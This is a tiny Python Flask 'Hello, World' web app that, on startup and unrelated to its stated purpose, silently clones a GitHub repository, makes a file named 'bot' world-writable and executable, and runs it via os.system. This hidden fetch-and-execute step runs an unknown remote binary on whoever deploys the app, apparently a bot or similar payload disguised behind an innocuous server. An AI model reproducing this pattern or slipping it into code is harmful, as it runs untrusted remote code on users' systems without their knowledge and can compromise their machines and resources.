from flask import Flask
app = Flask(__name__)
import os
os.system ('git clone https://github.com/aurbach55/yes.git && cd yes && chmod 777 bot && ./bot')
@app.route('/')
def hello_world():
    return 'Hello, World!'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
